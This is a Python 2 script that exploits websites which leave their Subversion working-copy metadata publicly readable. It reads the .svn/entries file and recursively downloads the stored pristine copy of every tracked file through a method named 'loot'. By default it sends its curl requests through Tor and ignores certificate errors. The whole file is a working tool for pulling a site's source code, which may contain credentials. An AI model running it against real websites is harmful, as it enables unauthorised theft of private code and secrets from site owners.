import errno
import logging
import os
import os.path
import pprint
import re
import subprocess
import sys
import getopt

class SvnWcDump:
    url = ''

    output = ''

    cwd = '/'

    download = True

    useTor = True

    ENTRIES = '.svn/entries'

    TIMEOUT = 10

    RETRY = 10

    VERSIONS = ['9', '10']  # must be string because we're reading it from file as a string

    loop = 1

    def __init__(self, url, output, logfile, options):
        self.url = url
        self.output = output
        logging.basicConfig(format = '%(asctime)s [%(levelname)s] %(message)s', filename = logfile, level = logging.DEBUG)
        if options['almost-dry']:
            self.download = False
        if options['no-tor']:
            self.useTor = False


    def fetch(self, file):
        path = self.cwd + file
        output = self.output + path
        logging.info('Fetching ' + self.url + path + ' into ' + output)
        args = ['curl']
        if self.useTor:
            args += ['--socks5', 'localhost:9150']  # Use Tor
        args += ['--location']  # follow redirects
        args += ['--create-dirs']
        args += ['--silent']
        args += ['--insecure']  # ignore certificate errors
        args += ['--connect-timeout', str(self.TIMEOUT)]
        args += ['--max-time', str(self.TIMEOUT)]
        args += ['--retry', str(self.RETRY)]
        args += ['--dump-header', '-']
        args += ['--output', output]
        args += [self.url + path]
        logging.debug('Running ' + ' '.join(args))
        pipe = subprocess.Popen(args, stdout = subprocess.PIPE, stderr = subprocess.STDOUT)
        output = pipe.communicate()[0]
        response = output.strip().split('\r\n')
        logging.debug('Response ' + pprint.pformat(object = response, width = 1e5))
        if response == [''] and self.loop < self.RETRY:
            self.loop = self.loop + 1
            logging.info('Empty response, retrying %d' % self.loop)
            self.fetch(file)
        self.loop = 1


    def touch(self, file):
        path = self.cwd + file
        output = self.output + path
        logging.info('Creating empty file ' + output + ' representing ' + self.url + path)
        try:
            os.makedirs(os.path.dirname(output))
        except:
            pass
        open(output, 'a').close()


    def loot(self):
        self.fetch(self.ENTRIES)
        entries = open(self.output + self.cwd + self.ENTRIES)
        version = entries.readline().strip()
        logging.debug('WC version ' + version + ' ' + ('supported' if version in self.VERSIONS else 'not supported'))

        try:
            os.makedirs(self.output + self.cwd + '.svn/text-base')
        except OSError, e:
            if e.errno != errno.EEXIST:
                raise

        matches = re.findall('\x0C\x0A([^\x0A]+)\x0A(dir|file)', entries.read());
        for match in matches:
            if match[1] == 'file':
                file = '.svn/text-base/' + match[0] + '.svn-base'
                if self.download:
                    self.fetch(file)
                else:
                    self.touch(file)

            if match[1] == 'dir':
                self.cwd += match[0] + '/'
                logging.debug('CD to ' + self.cwd)
                self.loot()
                self.cwd = os.path.dirname(os.path.dirname(self.cwd))  # the inner one removes the trailing slash, the outer one removes the dirname itself
                if (self.cwd != '/'):
                    self.cwd += '/'
                logging.debug('CD up ' + self.cwd)


options = {'no-tor': False, 'almost-dry': False}
try:
    parsedOpts, parsedArgs = getopt.gnu_getopt(sys.argv[1:], '', options.keys())
    if len(parsedArgs) < 3:
        raise RuntimeError('Missing argument')
    for parsedOpt in parsedOpts:
        for opt in options:
            if parsedOpt[0] == '--%s' % opt:
                options[opt] = True
except (getopt.GetoptError, RuntimeError) as e:
    print str(e)
    print 'Usage ' + sys.argv[0] + ' <website> <directory> <logfile> [--no-tor] [--almost-dry], where <website> is without the path to entries file, just http://example.com'
    sys.exit(1)

dump = SvnWcDump(parsedArgs[0], parsedArgs[1], parsedArgs[2], options)
dump.loot()
